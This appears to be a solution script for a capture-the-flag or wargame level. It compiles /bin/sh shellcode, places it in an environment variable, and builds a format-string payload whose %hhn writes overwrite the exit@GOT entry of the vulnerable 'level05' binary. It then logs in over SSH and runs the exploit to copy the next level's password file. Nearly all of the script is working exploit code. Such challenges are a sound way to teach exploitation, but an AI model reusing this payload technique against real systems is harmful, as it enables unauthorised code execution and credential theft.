#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)";

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

generate_shellcode() {
    asm_path="$1";

    if [ -z "$asm_path" ]; then
        log "Error: generate_shellcode requires an assembly source path.";
        return 1;
    elif [ ! -r "$asm_path" ]; then
        log "Error: assembly source '$asm_path' is not readable.";
        return 1;
    fi

    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d) || return 1;

    nasm -f elf32 "$asm_path" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    trap - EXIT INT TERM HUP QUIT;
    unset tmpdir shellcode asm_path;
    return 0;
}

# #### #
# MAIN #
# #### #

main() {
    # /!\ $host $port $username and $sshid_password are defined in the source '.sshid.sh' file.
    flag=""

    # Payload(s)

    shellcode="$(generate_shellcode './data/shellcode.asm')"; # \061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
    shellcode_length="$(printf '%b' "$shellcode" | wc -c)"; # 25

    if [ "$shellcode_length" -ne "25" ]; then
        log "Error: the generated shellcode didn't match the expected length in bytes.";
        return 1;
    fi

    # The 4 exit@GOT byte addresses.
    exit_got_addr_1='\340\227\004\010';
    exit_got_addr_2='\341\227\004\010';
    exit_got_addr_3='\342\227\004\010';
    exit_got_addr_4='\343\227\004\010';

    exit_got_addr="${exit_got_addr_1}${exit_got_addr_2}${exit_got_addr_3}${exit_got_addr_4}"; # 4 * 4 = 16 bytes.
    exit_got_addr_len="$(printf '%b' "$exit_got_addr" | wc -c)";

    # %hhn writes the total written bytes up until now. This makes each separate input inter-dependent.
    shellcode_addr_1="$((194 - $exit_got_addr_len))";   # \302 -> 194 - 16  = 178
    shellcode_addr_2="$((223 - 194))";                  # \337 -> 223 - 194 = 29
    shellcode_addr_3="$((255 - 223))";                  # \377 -> 255 - 223 = 32
    shellcode_addr_4="$((255 - 255))";                  # \377 -> 255 - 255 = 0

    # A %c always writes at least one char, so since 'shellcode_addr_4' is 0 we skip it (byte 4 is already at 255).
    payload="$exit_got_addr%${shellcode_addr_1}c%10\$hhn%${shellcode_addr_2}c%11\$hhn%${shellcode_addr_3}c%12\$hhn%13\$hhn"

    # Resolution

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket."; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
    {
        printf '%s' 'cat '/home/users/level06/.pass' > /tmp/flag.txt;';
    } | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b' '$payload\n'; cat -) | env -i SHELLCODE='$(printf %b "$shellcode")' ~/level05";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    printf '%s' "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
